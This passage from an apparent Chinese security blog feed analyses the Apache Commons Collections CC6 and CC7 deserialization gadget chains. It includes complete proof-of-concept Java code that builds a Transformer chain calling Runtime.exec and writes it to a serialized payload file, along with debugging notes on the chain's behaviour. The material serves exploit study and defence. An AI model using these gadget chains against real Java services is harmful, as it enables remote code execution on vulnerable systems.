(Object[])table.get(ht);</span><br><span class="line">        <span class="comment">//对node进行初始化</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            node = tablearray[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        key.set(node,TM);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc7payload-1.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(ht);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc7payload-1.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>执行效果：<br><img src="/posts/40ba40f0/cc7-1.png" title="执行效果"></p><h1 id="0x04、总结"><a href="#0x04、总结" class="headerlink" title="0x04、总结"></a>0x04、总结</h1><p>CC7相对于前面几个链，更换了入口，其中多层的equals方法调用，以及中间设置值绕了好一会，细节还是比较多，但理清过后还是比较容易理解，学习中间发现还有另外的延伸，能举一反三才是真正的进步。</p><h1 id="0x05、参考链接"><a href="#0x05、参考链接" class="headerlink" title="0x05、参考链接"></a>0x05、参考链接</h1><p><a href="https://paper.seebug.org/1242/#commons-collections">https://paper.seebug.org/1242/#commons-collections</a><br>java漫谈</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-CC6链学习与分析</title>
      <link href="/posts/9758c0a8.html"/>
      <url>/posts/9758c0a8.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>CC6也是在CC5的基础上，改变了入口，依旧单独列出来方便整理，写一起太乱了。</p><h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>引用CC1链分析中的描述<br>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p><blockquote><p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p></blockquote><p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p><h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66（版本无限制）<br>Commons Collections：3.2.1（漏洞版本在3.1-3.2.1）<br>maven项目pom.xml文件中添加依赖</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>在idea访问<code>Commons Collections</code>组件的文件时候点击上方的下载源代码就可以看到对应文件的.java文件了</p><h1 id="0x03、分析"><a href="#0x03、分析" class="headerlink" title="0x03、分析"></a>0x03、分析</h1><p>CC6基于CC5的变式，改变了触发入口点，简述CC5的触发过程</p><h2 id="回顾CC5链"><a href="#回顾CC5链" class="headerlink" title="回顾CC5链"></a>回顾CC5链</h2><ul><li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法。</li><li>将<code>LazyMap</code>对象传入<code>TiedMapEntry</code>类构造方法，再通过<code>TiedMapEntry.toString()</code>方法去调用<code>TiedMapEntry.getValue()</code>方法，最后调用到<code>lazyMap.get()</code>方法。</li><li>将<code>TiedMapEntry</code>对象通过反射赋值给<code>BadAttributeValueExpException</code>类的<code>val</code>值，通过反序列化<code>BadAttributeValueExpException</code>类对象，调用重写<code>readObject</code>方法中的<code>val.toString()</code>。</li><li><code>val.toString()</code>调用等效于<code>TiedMapEntry.toString()</code>，即调用<code>TiedMapEntry.getValue()</code>方法，达到调用<code>lazyMap.get()</code>方法触发代码执行。</li></ul><h2 id="CC6链分析"><a href="#CC6链分析" class="headerlink" title="CC6链分析"></a>CC6链分析</h2><p>在CC5中提到，调用<code>LazyMap.get()</code>方法，找到的新的入口<code>TiedMapEntry.getValue()</code>中调用的<code>get()</code>方法</p><p><img src="/posts/9758c0a8/cc6-1.png" title="TiedMapEntry.getValue()"></p><p>然后顺势寻找<code>getValue()</code>的调用情况，<code>TiedMapEntry</code>本类中有三个方法进行了调用</p><p><img src="/posts/9758c0a8/cc6-2.png" title="调用情况"></p><p>其中CC5就是<code>BadAttributeValueExpException</code>类调用了<code>toString()</code>方法形成的新入口。</p><p>除了<code>toString()</code>方法外，还有<code>hashCode()</code>和<code>equals()</code>，<code>hashCode()</code>能联想到<code>HashMap</code>，在学CC5的时候看到这三个方法我以为就是利用<code>hashCode()</code>，结果是<code>toString()</code>的调用链。</p><h3 id="实现思路一：HashMap"><a href="#实现思路一：HashMap" class="headerlink" title="实现思路一：HashMap"></a>实现思路一：HashMap</h3><p>继续看<code>hashCode()</code>的调用联想到的<code>HashMap</code>。</p><p><img src="/posts/9758c0a8/cc6-3.png" title="put值"></p><p><code>HashMap</code>在<code>put</code>值时，会对<code>key</code>进行<code>hash</code>操作，会调用<code>hash()</code>，其中<code>hash()</code>方法调用<code>key</code>参数的<code>hashCode()</code>方法，且key参数是可控的，为了调用<code>TiedMapEntry.hashCode()</code>，只需要将<code>TiedMapEntry</code>对象作为key传入<code>hash(Object key)</code>方法中，便能调用<code>TiedMapEntry.hashCode()</code>，达到执行代码的目的。</p><p><img src="/posts/9758c0a8/cc6-3.png" title="hash()"><br><img src="/posts/9758c0a8/cc6-4.png" title="执行效果"></p><p>执行效果：</p><p><img src="/posts/9758c0a8/cc6-5.png" title="hashCode()"></p><p>这时候就能触发代码执行了，开始想的<code>hashmap</code>也可以直接序列化，为啥就不直接把<code>hashmap</code>对象给序列化，虽然在本地会触发一次代码执行，但也算是个利用链，但在序列化和反序列化的过程发现都存在问题</p><p><img src="/posts/9758c0a8/cc6-6.png" title="报错"></p><h4 id="报错排查"><a href="#报错排查" class="headerlink" title="报错排查"></a>报错排查</h4><p>序列化过程报错<code>java.lang.ProcessImpl</code>，该对象无法序列化导出抛出异常，开始想半天也不知道这个对象是哪来的，随后进行序列化调试<br>因为是对<code>hashmap</code>对象进行的序列化，且<code>hashmap</code>重写了序列化和反序列化过程，所以直接断点重写的序列化步骤就行</p><p><img src="/posts/9758c0a8/cc6-7.png" title="断点"></p><p><code>hashmap</code>的序列化写入显示经过<code>defaultWriteObject()</code>默认的序列化写入，然后还会经过<code>internalWriteEntries()</code>序列化检查，通过断点下来给我感觉作用就是把<code>hashmap</code>放入<code>table</code>中对每个<code>Key-value</code>进行序列化写入，然后遍历每个map的元素依次序列化调用<code>defaultWriteObject()</code>方法</p><p>直接进<code>internalWriteEntries()</code>方法查看<code>Map</code>对象的情况，此时<code>table</code>中只有一个<code>key=TiedMapEntry</code>对象，该对象为我们<code>put</code>进的对象，</p><p><img src="/posts/9758c0a8/cc6-8.png" title="TM对象"></p><p>读取到<code>table</code>对象元素后进行<code>writeObject</code>写入，并判断元素类型，进入对应的序列化步骤</p><p><img src="/posts/9758c0a8/cc6-9.png" title="元素对象判断"></p><p>随后在序列化读取数据的，发现此时还存在另外一个<code>Key</code>元素，<code>key</code>值是<code>11</code>，也就是说<code>hashmap</code>的另外一个<code>map</code>中还存在一对键值对，<code>key</code>值为<code>11</code></p><p><img src="/posts/9758c0a8/cc6-10.png" title="map元素"></p><p>随后遍历到<code>key</code>值为<code>11</code>的元素后 会再次序列化，重复重写的<code>writeObject()</code>步骤去写入另一个<code>map</code>中元素</p><p><img src="/posts/9758c0a8/cc6-11.png" title="map元素"></p><p>此时序列化<code>table</code>内容就变为另外一个<code>map</code>的元素内容：<code>key</code>为<code>11</code>，<code>value</code>为<code>ProcessImpl</code>对象，随后再对<code>value</code>进行序列化写入的时候，由于<code>ProcessImpl</code>对象不可被序列化，导致抛出异常</p><p>序列化报错的原因找到了，现在就是找到为啥会多出来添加一组元素的<code>map</code>对象</p><p>由于序列化操作是已经对代码进行了编译，也就是说前面的代码已经被执行过了然后再对<code>hashmap</code>对象进行序列化，在序列化前<code>hashmap</code>的存在两个<code>map</code>，其中分别存在1组元素</p><p>回到<code>LazyMap.get()</code>这个触发点，在本地put值时会触发一次代码执行，此时的运行步骤</p><p><img src="/posts/9758c0a8/cc6-12.png" title="LazyMap.get()"></p><p>可以看到当前的<code>key</code>为<code>11</code>，为<code>TiedMapEntry</code>对象创建时传入构造方法的<code>key</code>值，会判断<code>map</code>中是否存在<code>key</code>为<code>11</code>的元素，当前由于<code>map</code>只有一个<code>TiedMapEntry</code>对象的<code>key</code>元素，不存在<code>key</code>为<code>11</code>的元素，因此会进入判断体，执行<code>factory.transform(key)</code>触发了代码执行，随后将返回来的值<code>ProcessImpl</code>对象赋值给<code>value</code>变量，然后进行<code>map.put(key，value)</code>，此时<code>key</code>为<code>11</code>，<code>value</code>为<code>TiedMapEntry</code>，因此当前<code>map</code>对象中会多出一组元素，导致序列化报错。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">hm.put(TM,<span class="number">111</span>);</span><br></pre></td></tr></table></figure><p>同时由于本地触发了漏洞，添加了<code>map</code>元素，导致反序列化时，<code>map</code>中已经存在<code>Key</code>为<code>11</code>的元素，因此不会进入判断体，不会触发代码执行。</p><h4 id="解决序列化问题"><a href="#解决序列化问题" class="headerlink" title="解决序列化问题"></a>解决序列化问题</h4><p>因此需要将新多出来的<code>map</code>元素进行删除，对象为<code>LazyMap.decorate(map,transformerChain)</code>传递进的<code>map</code>对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">Map hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">hm.put(TM,<span class="number">111</span>);</span><br><span class="line"><span class="comment">//删除map对象的新增的元素，避免序列化出错以及触发点失效</span></span><br><span class="line">map.remove(<span class="number">11</span>);</span><br></pre></td></tr></table></figure><p>此时序列化就不会再报错，同时反序列化也能触发漏洞。</p><p><img src="/posts/9758c0a8/cc6-13.png" title="解决序列化问题"></p><h4 id="解决本地触发问题"><a href="#解决本地触发问题" class="headerlink" title="解决本地触发问题"></a>解决本地触发问题</h4><p>解决本地触发，可以直接把触发点制空，在put完元素后，再通过反射把触发点设置给<code>Lazymap</code>，实现方法很多，原理都是一样的，都时是通过在put值时不触发<code>Runtime.exec()</code>就行，可以先制空或者填加一个正常的<code>ConstantTransformer</code>方法都可以。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="comment">//获取Runtime类对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//创建一个空的链转换器</span></span><br><span class="line">Transformer[] transformersfake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChainfake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformersfake);</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">Map hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">hm.put(TM,<span class="number">111</span>);</span><br><span class="line"><span class="comment">//删除map对象的新增的元素，避免序列化出错以及触发点失效</span></span><br><span class="line">map.remove(<span class="number">11</span>);</span><br><span class="line"><span class="comment">//通过反射将触发链转换器赋值给factory变量</span></span><br><span class="line">Field field=LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(Lmap,transformerChain);</span><br></pre></td></tr></table></figure><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC-1"></a>POC-1</h4><p>解决了上面问题，再加上序列化和反序列化步骤就得到完整POC，这里也不再写构造POC过程了，根据分析就得到大部分步骤了组合起来就行。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//创建一个空的链转换器</span></span><br><span class="line">        Transformer[] transformersfake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChainfake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformersfake);</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">        Map hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        hm.put(TM,<span class="number">111</span>);</span><br><span class="line">        <span class="comment">//删除map对象的新增的元素，避免序列化出错以及触发点失效</span></span><br><span class="line">        map.remove(<span class="number">11</span>);</span><br><span class="line">        Field field=LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(Lmap,transformerChain);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hm);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>实现效果：</p><p><img src="/posts/9758c0a8/cc6-14.png" title="实现效果"></p><h4 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h4><p>在上面的所有分析都基于 新建立了一个hashmap对象去put TiedMapEntry对象的分析，如下面的hm变量。开始没想那么多，单纯新建了一个hashmap对象想去触发漏洞，直到在学习分析思路二的时候，回过头看到代码，有个疑惑“为啥要多建立一个hashmap对象去触发，已经有一个hashmap对象了(如下面代码的map变量)，直接用map变量去put进TiedMapEntry对象不就行了”</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">Map hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">hm.put(TM,<span class="number">111</span>);</span><br><span class="line">map.remove(<span class="number">11</span>);</span><br></pre></td></tr></table></figure><p>然后将代码改成下面过后，本以为效果还是一样的，但运行过后发现，如果不要<code>map.remove(11);</code>即不删除map中key为11的元素，依旧能反序列化触发漏洞，而上面分析中新建hashmap对象去put进TiedMapEntry对象的话，必须要删除第一个hashmap对象中的key为11元素才能触发。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">map.put(TM,<span class="number">111</span>);</span><br><span class="line"><span class="comment">//map.remove(11);</span></span><br></pre></td></tr></table></figure><p>在调试过程中也发现运行完<code>map.put(TM,111);</code>后，也添加了key为11的元素，此时ma已经存在key为11的元素</p><p><img src="/posts/9758c0a8/cc6-20.png" title="map元素"></p><p>那在反序列化的时候，在触发漏洞点时不是应该<code>map.containsKey(key)</code>值为true吗，为什么实际运行结果是false然后触发漏洞</p><p><img src="/posts/9758c0a8/cc6-21.png" title="判断条件"></p><p>调试找下原因，<code>hashmap</code>重写了反序列化<code>readObject</code>，那在反序列化处打断点看看怎么读取数据的。<br><code>readObject</code>的前面部分代码就是获取一些序列化流的一些信息，然后在创建node节点，读取流中的map信息，依次把key和value进行put还原。<br>在关键读取map中下断点</p><p><img src="/posts/9758c0a8/cc6-22.png" title="断点分析"></p><p>可以看到第一个读取还原的<code>Map</code>元素，<code>key</code>为<code>TiedMapEntry</code>，<code>value</code>为<code>111</code></p><p><img src="/posts/9758c0a8/cc6-23.png" title="第一次还原元素"></p><p>读出来后，进行<code>putVal()</code>写入还原<code>hashmap</code>，其中会有<code>hash(key)</code>操作，跟进hash</p><p><img src="/posts/9758c0a8/cc6-24.png" title="hash操作"></p><p>然后调用到<code>hashCode()</code>,跟进<code>hashCode()</code>,调用<code>getValue()</code>,再跟进<code>getValue()</code>,进入到<code>get</code>方法中</p><p><img src="/posts/9758c0a8/cc6-25.png" title="get方法"></p><p>进入到判断体中，触发漏洞</p><p><img src="/posts/9758c0a8/cc6-26.png" title="触发漏洞"></p><p>可以看到当前的table表中没有任何元素，因此能进入判断体中触发漏洞，然后再Put添加元素</p><p><img src="/posts/9758c0a8/cc6-27.png" title="table表"></p><p>然后再跳过断点，回到主循环体，这时候读取第二组元素，此时的Key为11，然后再进行put操作</p><p><img src="/posts/9758c0a8/cc6-28.png" title="读取第二组元素"></p><p>至此，简述就是反序列化过程中，最先读取到<code>map</code>的<code>key</code>为<code>TiedMapEntry</code>的元素，然后进行<code>put</code>时由于<code>map</code>中没有存在<code>key</code>为<code>11</code>的元素，因此能够触发漏洞，触发完漏洞过后再还原写入<code>key</code>为<code>11</code>的元素。</p><p>同hashmap对象操作能触发的原因找到了，再看看不同hashmap对象操作时，同样不删除key为11的元素，为什么就不行</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">Map hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">hm.put(TM,<span class="number">111</span>);</span><br></pre></td></tr></table></figure><p>同样下断点，此时读取的元素&lt;key,value&gt;为(11,11)，不是上面情况的<code>key</code>为<code>TiedMapEntry</code>的元素，因此最开始就读取key为11的元素写入到map中，自然不会触发漏洞了</p><p><img src="/posts/9758c0a8/cc6-29.png" title="读取元素"></p><p>如果添加<code>map.remove(11);</code>删除key为11的步骤，在反序列化时读取的map元素就为<code>TiedMapEntry</code>元素，就能正常触发漏洞。</p><p><img src="/posts/9758c0a8/cc6-30.png" title="读取元素"></p><p>至此，原因找到了，但第二种情况为什么先还原的key为11，我的猜测：<br>第二种情况，由于第一个hashmap对象先创建，对第二个hashmap对象进行put操作，编译序列化写入的时候按顺序将第一个hashmap对象先写入此时已经将编译完成的值写入，导致在反序列化读取的时候第一个hashmap对象已经存在key为11的元素；而第一种情况，对同一个hashmap对象进行操作，顺序也是先Put进TiedMapEntry为Key，触发漏洞后，再创建put一个key为11的元素，所以序列化时第一个还原key为TiedMapEntry的map元素。</p><h4 id="POC-2"><a href="#POC-2" class="headerlink" title="POC-2"></a>POC-2</h4><p>通过上面遇到的疑惑，同hashmap对象也能触发漏洞，就得到了第二个poc</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span 